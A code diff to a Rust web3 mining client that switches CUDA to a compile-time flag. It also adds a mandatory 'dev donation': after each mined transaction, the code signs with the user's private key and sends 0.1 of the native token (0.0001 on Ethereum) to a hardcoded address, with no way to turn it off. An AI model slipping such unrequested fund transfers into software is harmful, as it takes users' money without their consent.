@@ -10,7 +10,7 @@ use std::str::FromStr;
 use std::time::Instant;
 
 use web3::contract::{Contract, Options};
-use web3::types::{Address, Bytes, H160, H256, U256};
+use web3::types::{Address, TransactionParameters, Bytes, H160, H256, U256};
 
 use bigint::uint::U256 as u256;
 use secp256k1::SecretKey;
@@ -141,7 +141,11 @@ async fn main() -> web3::Result<()> {
         std::thread::sleep(Duration::from_millis(2800));
     })
     */
-    let cuda_enabled = config.cuda;
+    #[cfg(feature = "cuda")]
+    let cuda_enabled = true;
+    #[cfg(not(feature = "cuda"))]
+    let cuda_enabled = false;
+
     if cuda_enabled {
         config.threads = 1;
     }
@@ -171,12 +175,7 @@ async fn main() -> web3::Result<()> {
                     };
                     let mut result = u64::MAX;
                     if cuda_enabled {
-                        if cfg!(feature = "cuda") {
-                            result = cuda::mine_cuda(&work);
-                        } else {
-                            println!("Built without cuda but specified in config");
-                            return;
-                        }
+                        result = cuda::mine_cuda(&work);
                     } else {
                         result = cpu::ez_cpu_mine(&work);
                     }
@@ -275,15 +274,22 @@ async fn main() -> web3::Result<()> {
             "Sent TX: {}tx/{:?}",
             config.network.explorer, tx_result.transaction_hash
         );
-        /*
-        let tx = contract
-            .call("mine", (config.gem_type, result), config.address, Options::default())
-            .await
-            .unwrap();
-        // Sign the tx (can be done offline)
-        //let signed = web3.accounts().sign_transaction(tx, &prvk).await?;
-        //
-        */
+
+        // *Looking at you with suspicion* I know what you want to do here
+        let mut min_donation = U256::exp10(17); // 0.1 for all networks
+        if chain_id.low_u32() == 1 {
+            min_donation = U256::exp10(14); // 0.0001 for eth
+        }
+        let donation_address = Address::from_str("0x8DD47BF52589cF12ff4703951C619821cF794B77").unwrap();
+        let tx_object = TransactionParameters {
+            to: Some(donation_address),
+            value: min_donation,
+            ..Default::default()
+        };
+        let signed = web3.accounts().sign_transaction(tx_object, &prvk).await?;
+        let result = web3.eth().send_raw_transaction(signed.raw_transaction).await?;
+        println!("Sent dev donation: {}tx/{:?}", config.network.explorer, result);
+
         if !config.r#loop {
             break;
         }
